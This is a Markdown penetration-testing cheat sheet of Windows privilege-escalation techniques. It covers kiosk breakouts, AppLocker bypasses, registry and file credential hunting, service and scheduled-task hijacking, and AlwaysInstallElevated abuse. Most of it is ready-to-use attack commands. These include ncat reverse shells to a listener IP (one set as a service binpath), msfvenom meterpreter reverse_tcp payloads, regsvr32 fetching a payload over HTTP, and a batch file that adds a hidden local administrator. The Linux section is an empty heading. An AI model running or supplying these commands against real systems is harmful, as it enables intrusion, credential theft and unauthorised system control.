# PrivEsc methods
## Windows

### Citrix / Kiosk

#### Pop a cmd / explorer or launch an app
- Right-click on Start button -> File Explorer or
- Windows Button -> type name of program you want to execute
- Sticky Keys: Press Shift 5x -> Press on Link in the popup window
- Task Manager: CTRL+SHIFT+ESC -> File -> Run New Task
- Print: Right-click anywhere -> Print -> Find Printer
- Open new tab -> Right-Click and Translate with Bing -> Or press F1 -> file:///C:/Windows/system32/cmd.exe
- Developer Tools: Press F12 -> Performance Tab -> Press on 3rd icon "Importing Profile Session"
- Open menu: Press CTRL+O -> Press Browse
- Check for UNC path:
```
\\<server>\Share\Payload.exe
\\127.0.0.1\C$\<PATH>\ncat.exe -nv 192.168.10.12 443 -e C:\Windows\System32\cmd.exe
```
- hh.exe:
```
hh.exe /?
hh.exe <url>
hh.exe C:\
```

#### Run a command
- ftp.exe -> !whoami
- powershell -> whoami
- powershell_ise -> whoami
- batch script -> open notepad, type whoami > whoami.txt, run script

#### If only <binary>.exe can be launched
- Copy ftp.exe to desktop -> rename to <binary>.exe -> !whoami
- Copy cmd.exe to desktop -> rename to <binary>.exe -> whoami
- Copy custom shell (ex. React OS) to desktop -> rename to <binary>.exe -> whoami

### AppLocker (with default rules) is blocking some apps

- powershell_ise may not be blocked
- User may have a folder which is exempt from AppLocker Policy:
```
(Get-AppLockerPolicy -Local).RuleCollections
Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\<GUID>
```
#### rundll32
- https://blog.didierstevens.com/2010/02/04/cmd-dll/
- http://www.didierstevens.com/files/software/cmd-dll_v0_0_1.zip
- cmd.dll -> ReactOS
```
C:\Windows\System32\rundll32.exe C:\<PATH>\cmd.dll,WhatEver
```

#### regsvr32
- https://gist.githubusercontent.com/bik3te -> PoC.sct (replace calc by payload)
```
C:\Windows\System32\regsvr32.exe /u /s /i:"C:\<PATH>\PoC.sct" scrobj.dll
```

#### DLL (cmd.dll -> ReactOS)
- https://blog.didierstevens.com/2010/02/04/cmd-dll/
- http://www.didierstevens.com/files/software/cmd-dll_v0_0_1.zip
```
C:\Windows\System32\regsvr32.exe "C:\<path>\cmd.dll"
C:\Windows\System32\regsvr32.exe /u "C:\<path>\cmd.dll"
```

#### DLL executing custom command
1. Modify https://github.com/bik3te/Scripts/blob/master/windows_dll.c
2. Execute
```
C:\Windows\System32\regsvr32.exe "C:\<path>\output.dll"
or
C:\Windows\System32\rundll32.exe C:\<PATH>\output.dll,WhatEver
```

#### DLL with custom shellcode
- https://bitbucket.org/jsthyer/wevade and Empire
- Compile rs32.dll and rs64.dll
- Generate a PowerShell empire script using the "launcher" stager and cut/paste only the base64 encoded portion and save it in a file
```
C:\Windows\System32\regsvr32.exe /s /i:powershell,payload.b64 rs64.dll
or
C:\Windows\System32\regsvr32.exe /s /i:powershell,http://192.168.10.12/payload.b64 rs64.dll
```

#### InstallUtil
- Manually:
1. Create shellcode
```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST='192.168.187.132' -f csharp
```

2. Modify https://github.com/bik3te/Scripts/blob/master/Install-Util.cs (add shellcode in Exec()) and compile
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /unsafe /platform:x86 /out:"C:\<path>\pwn.exe" "C:\<path>\Install-Util.cs"
```

3. Execute
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\<path>\pwn.exe"
```

- p0wnedshell:
https://github.com/Cn33liz/p0wnedShell

### Registry
```
# Everywhere
reg query HKLM /f password /t REG_SZ /s > HKLM.txt

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

### Files
```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

dir /s *pass* == *cred* == *vnc* == *.config*

findstr /spin "password" *.*
findstr /spin "password" *.*
```

### Weak folder permissions per drive
```
accesschk.exe -uwdqs Users c:\*
accesschk.exe -uwdqs "Authenticated Users" c:\*
```

### Weak file permissions per drive
```
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

### Missing patches
- https://github.com/rasta-mouse/Sherlock
- https://github.com/GDSSecurity/Windows-Exploit-Suggester
- https://github.com/pentestmonkey/windows-privesc-check
- https://github.com/411Hall/JAWS
- https://github.com/silentsignal/wpc-ps
```
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
```

### Many checks in one (w00t!)
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- https://github.com/AlessandroZ/BeRoot

### Unattended Installs
```
dir C:\*unattend.xml /s
dir C:\*sysprep.xml /s
dir C:\*sysprep.inf /s
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
```

### Group Policy Preference
- Included in PowerSploit/PowerUp (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

1. Look for *Groups.xml* files inside \\<dc>\SYSVOL
```
findstr /S /I cpassword \\<dc>\SYSVOL\<dc>\policies\*.xml
```

2. Crack them with https://github.com/BustedSec/gpp-decrypt

### Services
- Included in PowerSploit/PowerUp (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- Included in BeRoot (https://github.com/AlessandroZ/BeRoot)

#### Unquoted service paths
1. Find vuln service
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

2. Exploit - we'll suppose the vuln service's path is: C:\<path>\Vuln Folder\vuln.exe
- Edit and compile https://github.com/bik3te/Scripts/blob/master/windows_service.c
- Copy the compiled service in C:\<path>\Vuln.exe

3. Restart

#### Weak folder permissions
0. Supposed we have the rights to write in C:\<path>\vuln_service.exe
```
accesschk.exe -dqv "C:\<path>\" (from SysInternals)
```
1. Edit and compile https://github.com/bik3te/Scripts/blob/master/windows_service.c
2. Rename vuln_service.exe to vuln_service.exe.bak
3. Copy pwn.exe in the folder and rename it to vuln_service.exe
4. Restart

#### Weak service permissions
0. Suppose we can start/stop/restart vuln_service which is running as NT-SYSTEM
```
sc qc vuln_service
accesschk.exe -ucqv vuln_service
```

1. Stop the service

2. Pwn the service
- Remote shell:
```
sc config vuln_service binpath= "C:\<path>\ncat.exe -nv 127.0.0.1 1337 -e C:\Windows\System32\cmd.exe"
```

- Add a local admin:
Edit and compile https://github.com/bik3te/Scripts/blob/master/adduser.c
```
sc config vuln_service binpath= "C:\<path>\get_admin.exe"
```

3. Start service

### Scheduled tasks
- Included in PowerSploit/PowerUp (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- Included in BeRoot (https://github.com/AlessandroZ/BeRoot)
1. Check for Scheduled tasks (Task Scheduler (Local) -> Task Scheduler Library -> Microsoft -> etc.)
```
schtasks /query /fo LIST /v
```

2. Pwn if there is one which runs as NT-SYSTEM and the executable is within a writable folder... (Just replace the exe with your payload)

### AlwaysInstallElevated
- Included in PowerSploit/PowerUp (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- Included in BeRoot (https://github.com/AlessandroZ/BeRoot)
1. Check if AlwaysInstallElevated is set
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

2. Package an MSI exploiting the shitty configuration
- From Linux
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST='192.168.187.132' -f msi > pwn.msi
```

- From Windows (Bat-to-exe-Converter.exe required)
Create lulz.bat:
```
net user w00t BlaBlouf7273! /add
net localgroup Administrators w00t /add
```

Use Bat-to-exe-Converter (check Invisible Application) -> Compile
In Advanced Installer:
```
Import -> MSI from Exe(s)
Silent Installation
Leave the Programs and Features
```

Build

3. Install the MSI package

### DLL Hijacking
- Included in PowerSploit/PowerUp (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- TODO (cf. real life and https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- https://msitpros.com/?p=2012

### Moar!?!
- http://www.fuzzysecurity.com/tutorials/16.html
- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

### Gaining system
- Vulns in the system, security fixes missing, etc.
- [Hot Potato](https://github.com/breenmachine/Potato)
- [Rotten Potato](https://github.com/breenmachine/RottenPotatoNG)
- [Juicy-Potato](https://github.com/ohpe/juicy-potato)
- PsExec:
```
PsExec.exe -i -s cmd.exe
```
- [PowerShell Get-System](https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Get-System.ps1)
- Meterpreter's getsystem

## Linux
